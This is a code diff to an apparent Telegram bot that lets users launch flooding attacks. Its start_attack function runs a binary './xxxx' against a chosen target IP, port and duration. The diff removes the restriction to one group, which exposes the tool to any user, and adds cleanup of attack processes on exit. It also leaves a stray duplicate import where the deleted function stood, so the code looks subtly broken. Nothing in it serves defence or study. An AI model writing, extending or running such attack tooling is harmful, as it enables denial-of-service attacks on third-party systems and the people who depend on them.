@@ -3,6 +3,7 @@ import subprocess
 import datetime
 import itertools
 import requests
+import atexit
 import threading
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
@@ -15,13 +16,8 @@ user_processes = {}
 MAX_DURATION = 300  # Max attack duration in seconds
 
 # Ensure commands are executed in the correct group
-async def ensure_correct_group(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
-    if update.effective_chat.id != GROUP_ID:
-        await update.message.reply_text(f"❌ This bot can only be used in a specific group. Join here: {GROUP_LINK}")
-        return False
-    return True
+import atexit
 
-# Function to handle the attack in a separate thread
 def start_attack(target_ip, port, duration, user_id):
     command = ['./xxxx', target_ip, str(port), str(duration)]
     try:
@@ -31,13 +27,24 @@ def start_attack(target_ip, port, duration, user_id):
             "target_ip": target_ip,
             "port": port
         }
+
+        # Register cleanup for when the script exits
+        def cleanup():
+            if process.poll() is None:  # Check if the process is still running
+                process.terminate()
+                process.wait()
+
+        atexit.register(cleanup)
+
         # Wait for the attack to finish
         process.wait()
+
         # After the attack finishes, remove the process from the dictionary
         del user_processes[user_id]
         logging.info(f"Attack finished on {target_ip}:{port} by user {user_id}")
     except Exception as e:
         logging.error(f"Error starting attack: {str(e)}")
+
 
 # Start command handler
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
